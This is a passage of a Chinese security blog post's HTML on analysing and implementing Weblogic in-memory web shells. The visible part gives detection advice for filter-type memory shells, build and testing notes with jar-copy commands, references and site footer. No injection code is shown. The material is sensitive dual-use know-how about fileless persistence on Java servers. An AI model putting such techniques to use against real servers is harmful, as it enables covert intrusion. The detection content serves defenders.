+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;name %30s\\turl %30s\\tDocroot %s\\n&#34;</span><span class="o">,</span> <span class="n">context</span><span class="o">.</span><span class="na">getAppName</span><span class="o">(),</span> <span class="n">context</span><span class="o">.</span><span class="na">getContextPath</span><span class="o">(),</span> <span class="n">context</span><span class="o">.</span><span class="na">getRootTempDir</span><span class="o">().</span><span class="na">getAbsolutePath</span><span class="o">()));</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="内存马查杀"><a href="#内存马查杀" class="anchor-link">#</a><a href="#contents:内存马查杀" class="headings">内存马查杀</a></h2>
+<p>要找到是否有filter类型的内存马，只需在getFilterChain处下手即可；只要从FileManager中的filters删掉恶意filter，filter链就不会有恶意filter了。</p>
+<p>filter类型的内存马有两个很致命的特点，第一是继承Filter类，第二因为我们使用defineClass加载的类，是不会有class文件落地的，因此查看它的类加载路径会返回null。</p>
+<h2 id="测试注意事项"><a href="#测试注意事项" class="anchor-link">#</a><a href="#contents:测试注意事项" class="headings">测试注意事项</a></h2>
+<ol>
+<li>
+<p>部署war包到Weblogic 1036注意Web.xml文件格式的问题</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;web-app</span> <span class="na">version=</span><span class="s">&#34;2.5&#34;</span> <span class="na">metadata-complete=</span><span class="s">&#34;true&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt;&#34;</span>
+         <span class="na">xmlns:xsi=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
+         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&#34;</span><span class="nt">&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>本地测试时，编写的代码使用到了Weblogic的依赖，打war包的时候需要添加在pom.xml中需要添加jar包的依赖。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>weblogic.servlet.internal<span class="nt">&lt;/groupId&gt;</span><span class="c">&lt;!--groupId和artifactId随便写--&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>weblogic-classes<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>1.0.0<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;scope&gt;</span>system<span class="nt">&lt;/scope&gt;</span>
+    <span class="nt">&lt;systemPath&gt;</span>${project.basedir}/lib/weblogic-classes.jar<span class="nt">&lt;/systemPath&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>xxx<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>xxx<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>1.0.0<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;scope&gt;</span>system<span class="nt">&lt;/scope&gt;</span>
+    <span class="nt">&lt;systemPath&gt;</span>${project.basedir}/lib/weblogic.server.merged.jar<span class="nt">&lt;/systemPath&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>从docker中导出wlserver目录下的包后，提取出所有jar包再导入idea。（不然可能找不到weblogic-classes.jar包）
+windows命令</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="k">for</span> <span class="p">/</span><span class="n">f</span> <span class="s2">&#34;delims==&#34;</span> <span class="k">%</span><span class="n">a</span> <span class="k">in</span> <span class="p">(</span><span class="s1">&#39;dir /b /s C:\\Users\\xxx\\Desktop\\WeblogicEnvironment\\middleware\\bak\\*.jar&#39;</span><span class="p">)</span><span class="k">do</span> <span class="nb">copy </span><span class="p">/</span><span class="n">y</span> <span class="s2">&#34;%a&#34;</span> <span class="n">C:</span><span class="p">\\</span><span class="n">Users</span><span class="p">\\</span><span class="n">xxx</span><span class="p">\\</span><span class="n">Desktop</span><span class="p">\\</span><span class="n">jar2</span><span class="p">\\</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>Linux命令</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#复制modules下jar后缀文件到jar目录</span>
+find modules/ -name <span class="s2">&#34;*.jar&#34;</span> <span class="p">|</span>xargs -n1 -I <span class="o">{}</span> cp <span class="o">{}</span> ./jar/<span class="p">;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ol>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li><a href="https://www.cnblogs.com/nice0e3/p/14956677.html" target="_blank" rel="noopener">Java安全之Weblogic内存马</a></li>
+<li><a href="https://mp.weixin.qq.com/s/tgQO9ILHudfkkOzeahICTg" target="_blank" rel="noopener">红蓝必备 你需要了解的weblogic攻击手法</a></li>
+<li><a href="https://www.cnblogs.com/bitterz/p/14970230.html" target="_blank" rel="noopener">Weblogic下的servlet内存马注入-无参照纯调试</a></li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">https://myzxcg.com/2021/11/Weblogic-内存马分析与实现/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Spring 内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Shiro 回显与内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" class="related-link">Tomcat 内存马分析及检测</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E4%B8%8E%E5%88%A9%E7%94%A8/" class="related-link">FastJson 反序列化绕过与利用</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" rel="prev">&lt; Spring 内存马实现</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" rel="next">Shiro 回显与内存马实现 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
